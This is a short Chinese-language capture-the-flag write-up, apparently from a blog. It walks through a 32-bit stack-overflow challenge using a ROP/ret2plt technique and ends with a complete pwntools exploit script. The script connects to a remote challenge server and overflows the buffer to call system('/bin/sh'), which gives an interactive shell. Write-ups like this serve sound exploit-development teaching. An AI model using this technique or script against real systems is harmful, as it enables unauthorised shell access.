此题考验的是对ROP链攻击的基础

![](https://img2020.cnblogs.com/blog/2500585/202108/2500585-20210824215139422-2052308218.png)

万事开头PWN第一步checksec 一下

![](https://img2020.cnblogs.com/blog/2500585/202108/2500585-20210824215139212-1780470260.png)

32位的小端程序，扔进IDA

![](https://img2020.cnblogs.com/blog/2500585/202108/2500585-20210824215138975-1329046888.png)

进入函数，找出栈溢出漏洞。

![](https://img2020.cnblogs.com/blog/2500585/202108/2500585-20210824215138746-605401308.png)

又是这个位置的栈溢出，read的0x100，buf的0x88，根据提示，寻找构建ROP链的攻击

![](https://img2020.cnblogs.com/blog/2500585/202108/2500585-20210824215138489-346669972.png)

![](https://img2020.cnblogs.com/blog/2500585/202108/2500585-20210824215138192-327910748.png)

直接就找到了system和/bin/sh，开始写exp

```python
from pwn import *
io = remote('111.200.241.244',56855)
#连接远程
elf = ELF('./1ab77c073b4f4524b73e086d063f884e')
#elf载入本地程序，因为没有开PIE
system_adr = elf.plt['system']
#获取system在plt表中的地址
binsh_adr = next(elf.search(b'/bin/sh'))
#在程序搜寻binsh的地址
payload = b'a'*(0x88+4) + p32(system_adr) + b'dead'+p32(binsh_adr)
#buf定义了0x88个字节，+4覆盖ebp，填入system地址
#b'dead'是system的返回地址，我瞎写的，为了栈平衡
#传入binsh的地址
io.recv()
io.send(payload)
io.interactive()
```

然后去运行一下exp，攻击完成，老师，交交交。。。交卷！！！

![](https://img2020.cnblogs.com/blog/2500585/202108/2500585-20210824215137906-2036721125.png)